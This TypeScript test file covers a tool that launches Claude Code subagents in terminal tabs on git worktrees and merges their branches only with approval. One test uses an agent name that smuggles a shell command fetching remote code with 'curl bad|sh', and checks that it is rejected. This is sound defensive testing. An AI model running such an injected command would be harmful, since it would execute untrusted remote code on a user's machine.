import { expect, test } from 'claude-code/testing'
import { agentFile, agentLine, getTask, handoffPrompt, launchAgent, listAgents, mergeAgent, parseAgent, saveAgent, setTask, worktreeOf } from './agents'
import type { AgentSpec, Io, Ran } from './agents'
import { paneIdFrom, runArgv, tabArgv } from './herdr'

const SPEC: AgentSpec = { name: 'reviewer', description: 'Reviews diffs', model: 'sonnet', effort: 'high', tools: ['Read', 'Grep'], instructions: 'Review the change.\nBe brief.' }
const H = { bin: '/bin/herdr', pane: 'wC:p1' }

/** An in-memory project: files by absolute path, and every command run. */
// Real `herdr tab create` reply (trimmed).
const TAB_REPLY = '{"id":"cli:tab:create","result":{"root_pane":{"pane_id":"wC:p3","tab_id":"wC:t4","workspace_id":"wC"},"tab":{"label":"reviewer","tab_id":"wC:t4","workspace_id":"wC"},"type":"tab_created"}}'

const ok = (stdout = ''): Ran => ({ exitCode: 0, stdout, stderr: '' })
const fail = (stderr = 'fatal'): Ran => ({ exitCode: 1, stdout: '', stderr })

/** `git` replies by subcommand text (argv after `-C <dir>`, joined); a repo with no worktrees unless a reply says otherwise. */
type GitReplies = Record<string, Ran>

function memIo(files: Record<string, string> = {}, split = TAB_REPLY, git: GitReplies = {}) {
  const runs: string[][] = []
  const io: Io = {
    read: async p => { if (!(p in files)) throw new Error('ENOENT'); return files[p]! },
    list: async d => Object.keys(files).filter(p => p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes('/')).map(p => p.slice(d.length + 1)),
    write: async (p, t) => { files[p] = t },
    run: async argv => {
      runs.push(argv)
      if (argv[0] === 'git') {
        const sub = argv.slice(3).join(' ')
        const hit = Object.keys(git).find(k => sub.startsWith(k))
        return hit ? git[hit]! : ok(sub.startsWith('rev-parse --is-inside-work-tree') ? 'true' : '')
      }
      return { exitCode: 0, stdout: argv[1] === 'tab' ? split : '', stderr: '' }
    },
  }
  return { io, files, runs }
}

test('agent file round-trips through parse', () => {
  expect(parseAgent(agentFile(SPEC), 'reviewer', 'project')).toEqual({ ...SPEC, source: 'project', ok: true })
  const bare: AgentSpec = { name: 'x', description: 'X', instructions: 'Do x.' }
  expect(parseAgent(agentFile(bare), 'x', 'user')).toEqual({ ...bare, source: 'user', ok: true })
})

test('agent line: configuration summary, and a garbled file never breaks it', () => {
  expect(agentLine({ ...SPEC, source: 'user', ok: true })).toBe('reviewer · sonnet · high · Read, Grep · user — Reviews diffs')
  expect(agentLine({ name: 'x', description: 'X', instructions: '', source: 'project', ok: true })).toBe('x · inherit · default · all tools · project — X')
  expect(agentLine(parseAgent('no frontmatter here', 'x', 'project'))).toBe('x (unreadable frontmatter) · project')
})

test('list: project agents first, user agents with the same name hidden', async () => {
  const { io } = memIo({
    '/p/.claude/agents/reviewer.md': agentFile(SPEC),
    '/p/.claude/agents/notes.txt': 'ignored',
    '/h/.claude/agents/reviewer.md': agentFile({ ...SPEC, model: 'opus' }),
    '/h/.claude/agents/scout.md': agentFile({ name: 'scout', description: 'Finds code', instructions: 'Find.' }),
  })
  const all = await listAgents(io, '/p', '/h')
  expect(all.map(a => `${a.name}:${a.source}:${a.model ?? ''}`)).toEqual(['reviewer:project:sonnet', 'scout:user:'])
  expect(await listAgents(memIo().io, '/p', '/h')).toEqual([])
})

test('save: writes the project agent, refuses to overwrite unless asked, rejects bad names', async () => {
  const { io, files } = memIo()
  expect(await saveAgent(io, '/p', SPEC, false)).toEqual({ text: 'Saved agent reviewer to .claude/agents/reviewer.md.', isError: false })
  expect(files['/p/.claude/agents/reviewer.md']).toBe(agentFile(SPEC))
  expect((await saveAgent(io, '/p', SPEC, false)).isError).toBe(true)
  expect((await saveAgent(io, '/p', { ...SPEC, model: 'opus' }, true)).isError).toBe(false)
  expect((await saveAgent(io, '/p', { ...SPEC, name: '../evil' }, false)).isError).toBe(true)
})

test('task file: set writes goal and prompt, get reads it back', async () => {
  const { io, files } = memIo()
  expect(await getTask(io, '/p')).toBe(undefined)
  await setTask(io, '/p', 'Full prompt.', 'Add a flag')
  expect(files['/p/.claude/helm/task.md']).toBe('# Add a flag\n\nFull prompt.\n')
  expect(await getTask(io, '/p')).toBe('# Add a flag\n\nFull prompt.\n')
})

test('herdr argv: a new tab labelled with the agent, in this workspace, with the agent env; run claude --agent; pane id from the JSON', () => {
  expect(tabArgv(H, '/p', 'reviewer')).toEqual(['/bin/herdr', 'tab', 'create', '--workspace', 'wC', '--cwd', '/p', '--label', 'reviewer', '--env', 'HELM_AGENT=reviewer', '--no-focus'])
  expect(tabArgv(H, '/p', 'reviewer', 'uds:/s.sock')).toEqual(['/bin/herdr', 'tab', 'create', '--workspace', 'wC', '--cwd', '/p', '--label', 'reviewer', '--env', 'HELM_AGENT=reviewer', '--env', 'HELM_PARENT=uds:/s.sock', '--no-focus'])
  expect(paneIdFrom(TAB_REPLY)).toBe('wC:p3')
  // herdr types `run`'s words into the pane's shell joined by spaces: the command goes as one shell-quoted string.
  expect(runArgv(H, 'wC:p3', 'reviewer', "go: it's here")).toEqual(['/bin/herdr', 'pane', 'run', 'wC:p3', "claude --agent 'reviewer' 'go: it'\\''s here'"])
  expect(paneIdFrom('{"id":"x","result":{"pane":{"pane_id":"wC:p3"}}}')).toBe('wC:p3')
  expect(paneIdFrom('nope')).toBe(undefined)
})

const withAgentAndTask = () => memIo({ '/p/.claude/agents/reviewer.md': agentFile(SPEC), '/p/.claude/helm/task.md': '# Goal\n\nPrompt.\n' })

const WT = '/p-wt/reviewer'
const gitRuns = (runs: string[][]) => runs.filter(a => a[0] === 'git').map(a => a.slice(3).join(' '))

test('launch: happy path makes the worktree, then opens the tab in it and runs the agent on the main tree task file', async () => {
  const { io, runs } = withAgentAndTask()
  const r = await launchAgent(io, { root: '/p', home: '/h', herdr: H, parent: 'uds:/s.sock' }, 'reviewer')
  expect(r).toEqual({ text: 'Started reviewer in a new tab "reviewer" (pane wC:p3), worktree /p-wt/reviewer on branch helm/reviewer.', isError: false })
  expect(worktreeOf('/p', 'reviewer')).toEqual({ path: WT, branch: 'helm/reviewer' })
  expect(runs).toEqual([
    ['git', '-C', '/p', 'rev-parse', '--is-inside-work-tree'],
    ['git', '-C', '/p', 'worktree', 'list', '--porcelain'],
    ['git', '-C', '/p', 'worktree', 'add', WT, '-b', 'helm/reviewer'],
    tabArgv(H, WT, 'reviewer', 'uds:/s.sock'),
    runArgv(H, 'wC:p3', 'reviewer', handoffPrompt('/p/.claude/helm/task.md', 'helm/reviewer', 'reviewer')),
  ])
  expect(tabArgv(H, WT, 'reviewer', 'uds:/s.sock')).toContain('HELM_PARENT=uds:/s.sock')
  const prompt = handoffPrompt('/p/.claude/helm/task.md', 'helm/reviewer', 'reviewer')
  expect(prompt).toContain('Read /p/.claude/helm/task.md: it is your task, already approved.')
  expect(prompt).toContain('Start with the superpowers brainstorming skill if it is available')
  expect(prompt).toContain('helm/reviewer')
  expect(prompt).toContain('/helm:agent merge reviewer')
  expect(prompt).toContain('Merge: yes or no')
  expect(prompt).not.toContain('git push')
})

test('launch: an existing worktree is reused (no git add), and the reply says so', async () => {
  const { io, runs } = withAgentAndTask()
  const git = { 'worktree list': ok(`worktree /p\nbranch refs/heads/main\n\nworktree ${WT}\nbranch refs/heads/helm/reviewer\n`) }
  const m = memIo({ '/p/.claude/agents/reviewer.md': agentFile(SPEC), '/p/.claude/helm/task.md': 'x' }, TAB_REPLY, git)
  const r = await launchAgent(m.io, { root: '/p', home: '/h', herdr: H }, 'reviewer')
  expect(r.isError).toBe(false)
  expect(r.text).toContain('reused')
  expect(gitRuns(m.runs).some(g => g.startsWith('worktree add'))).toBe(false)
  void io; void runs
})

test('launch: an existing branch without a worktree is checked out into one', async () => {
  const m = memIo({ '/p/.claude/agents/reviewer.md': agentFile(SPEC), '/p/.claude/helm/task.md': 'x' }, TAB_REPLY, { 'worktree add /p-wt/reviewer -b': fail('already exists') })
  const r = await launchAgent(m.io, { root: '/p', home: '/h', herdr: H }, 'reviewer')
  expect(r.isError).toBe(false)
  expect(gitRuns(m.runs)).toContain('worktree add /p-wt/reviewer helm/reviewer')
})

test('launch: git failing to add the worktree is an error and no tab opens', async () => {
  const m = memIo({ '/p/.claude/agents/reviewer.md': agentFile(SPEC), '/p/.claude/helm/task.md': 'x' }, TAB_REPLY, { 'worktree add': fail('boom') })
  const r = await launchAgent(m.io, { root: '/p', home: '/h', herdr: H }, 'reviewer')
  expect(r.isError).toBe(true)
  expect(r.text).toContain('boom')
  expect(m.runs.some(a => a[1] === 'tab' || a[1] === 'pane')).toBe(false)
})

test('launch: outside a git repo it opens the tab in the main tree, no worktree', async () => {
  const m = memIo({ '/p/.claude/agents/reviewer.md': agentFile(SPEC), '/p/.claude/helm/task.md': 'x' }, TAB_REPLY, { 'rev-parse': fail('not a git repository') })
  const r = await launchAgent(m.io, { root: '/p', home: '/h', herdr: H }, 'reviewer')
  expect(r).toEqual({ text: 'Started reviewer in a new tab "reviewer" (pane wC:p3).', isError: false })
  expect(gitRuns(m.runs)).toEqual(['rev-parse --is-inside-work-tree'])
  expect(m.runs.at(-2)).toEqual(tabArgv(H, '/p', 'reviewer'))
})

test('launch refuses without a task, outside herdr, inside an agent, or for an unknown name; nothing runs', async () => {
  const noTask = memIo({ '/p/.claude/agents/reviewer.md': agentFile(SPEC) })
  expect((await launchAgent(noTask.io, { root: '/p', home: '/h', herdr: H }, 'reviewer')).text).toContain('/helm:prompt')
  expect(noTask.runs).toEqual([])

  const out = withAgentAndTask()
  expect((await launchAgent(out.io, { root: '/p', home: '/h', herdr: null }, 'reviewer')).text).toContain('herdr')
  expect((await launchAgent(out.io, { root: '/p', home: '/h', herdr: H, agentEnv: 'scout' }, 'reviewer')).isError).toBe(true)
  const unknown = await launchAgent(out.io, { root: '/p', home: '/h', herdr: H }, 'ghost')
  expect(unknown.isError).toBe(true)
  expect(unknown.text).toContain('reviewer')
  expect(out.runs).toEqual([])
})

test('launch: a tab reply without a pane id is an error carrying herdr output', async () => {
  const { io } = memIo({ '/p/.claude/agents/reviewer.md': agentFile(SPEC), '/p/.claude/helm/task.md': 'x' }, 'weird output')
  const r = await launchAgent(io, { root: '/p', home: '/h', herdr: H }, 'reviewer')
  expect(r.isError).toBe(true)
  expect(r.text).toContain('weird output')
})

test('tools through the engine: set_task writes the task file and re-anchors the deck; agent_list lists', async ($, on) => {
  const files: Record<string, string> = { '/p/.claude/agents/reviewer.md': agentFile(SPEC) }
  on('session.cwd', () => ({ value: '/p' }) as never)
  on('env.get', (_, e) => ({ value: JSON.stringify(e).includes('HOME') ? '/h' : undefined }) as never)
  on('clock.now', () => ({ value: 1 }))
  on('fs.read', (_, e) => { const p = (e as { path: string }).path; if (!(p in files)) throw new Error('ENOENT'); return { value: files[p] } })
  on('fs.write', (_, e) => { files[(e as { path: string }).path] = (e as { text: string }).text; return { value: undefined } })
  on('fs.list', (_, e) => {
    const d = (e as { path: string }).path
    return { value: Object.keys(files).filter(p => p.startsWith(`${d}/`)).map(p => ({ name: p.slice(d.length + 1), kind: 'file', size: 1, mtimeMs: 1, isLink: false })) }
  })
  const said = (r: unknown) => String((r as { result?: string }).result ?? (r as { deny?: string }).deny)
  expect(said(await $.tool.call({ tool: 'mcp__helm__set_task', prompt: 'Full prompt.', goal: 'Add a flag' } as never))).toContain('Add a flag')
  expect(files['/p/.claude/helm/task.md']).toBe('# Add a flag\n\nFull prompt.\n')
  expect(said(await $.tool.call({ tool: 'mcp__helm__agent_list' } as never))).toBe('reviewer · sonnet · high · Read, Grep · project — Reviews diffs')
})

test('launch refuses an agent whose file name or frontmatter name is not [a-z0-9-]', async () => {
  const evil = "x\\' ; curl bad|sh #"
  const { io, runs } = memIo({ '/p/.claude/agents/evil.md': agentFile({ name: evil, description: 'E', instructions: 'e' }), '/p/.claude/helm/task.md': 'x' })
  const r = await launchAgent(io, { root: '/p', home: '/h', herdr: H }, evil)
  expect(r.isError).toBe(true)
  expect(runs).toEqual([])
})

const merging = (git: GitReplies = {}) => memIo({}, TAB_REPLY, git)
const noPush = (runs: string[][]) => expect(runs.some(a => a.includes('push'))).toBe(false)

test('merge: without approval it only previews the diff and commits, and never merges', async () => {
  const m = merging({ 'diff --stat': ok(' a.ts | 2 +-\n'), 'log --oneline': ok('abc1234 feat: x\n') })
  const r = await mergeAgent(m.io, { root: '/p' }, 'reviewer', {})
  expect(r.isError).toBe(false)
  expect(r.text).toContain('a.ts | 2 +-')
  expect(r.text).toContain('abc1234 feat: x')
  expect(r.text).toContain('approve')
  expect(gitRuns(m.runs).some(g => g.startsWith('merge'))).toBe(false)
  noPush(m.runs)
})

test('merge: approved runs a no-ff local merge; cleanup only when asked', async () => {
  const m = merging()
  const r = await mergeAgent(m.io, { root: '/p' }, 'reviewer', { approve: true })
  expect(r.isError).toBe(false)
  expect(gitRuns(m.runs)).toContain('merge --no-ff helm/reviewer -m merge helm/reviewer')
  expect(gitRuns(m.runs).some(g => g.startsWith('worktree remove') || g.startsWith('branch -d'))).toBe(false)
  const c = merging()
  await mergeAgent(c.io, { root: '/p' }, 'reviewer', { approve: true, cleanup: true })
  expect(gitRuns(c.runs)).toEqual(expect.arrayContaining([`worktree remove ${WT}`, 'branch -d helm/reviewer']))
  noPush(m.runs); noPush(c.runs)
})

test('merge: a conflict is aborted, the files are reported, and the branch is kept', async () => {
  const m = merging({ 'merge --no-ff': fail('CONFLICT'), 'diff --name-only': ok('a.ts\nb.ts\n') })
  const r = await mergeAgent(m.io, { root: '/p' }, 'reviewer', { approve: true, cleanup: true })
  expect(r.isError).toBe(true)
  expect(r.text).toContain('a.ts')
  expect(r.text).toContain('b.ts')
  expect(gitRuns(m.runs)).toContain('merge --abort')
  expect(gitRuns(m.runs).some(g => g.startsWith('branch -d') || g.startsWith('worktree remove'))).toBe(false)
})

test('merge: unknown branch or a bad name is an error and runs nothing destructive', async () => {
  const m = merging({ 'rev-parse --verify': fail('unknown') })
  expect((await mergeAgent(m.io, { root: '/p' }, 'ghost', { approve: true })).isError).toBe(true)
  expect(gitRuns(m.runs).some(g => g.startsWith('merge'))).toBe(false)
  expect((await mergeAgent(m.io, { root: '/p' }, 'Bad Name', { approve: true })).isError).toBe(true)
})

test('tools through the engine: an agent session cannot call agent_merge', async ($, on) => {
  on('session.cwd', () => ({ value: '/p' }) as never)
  on('env.get', (_, e) => ({ value: JSON.stringify(e).includes('HELM_AGENT') ? 'reviewer' : undefined }) as never)
  const r = (await $.tool.call({ tool: 'mcp__helm__agent_merge', name: 'reviewer', approve: true } as never)) as { result?: string; deny?: string }
  expect(String(r.result ?? r.deny)).toContain('only the main session merges')
})
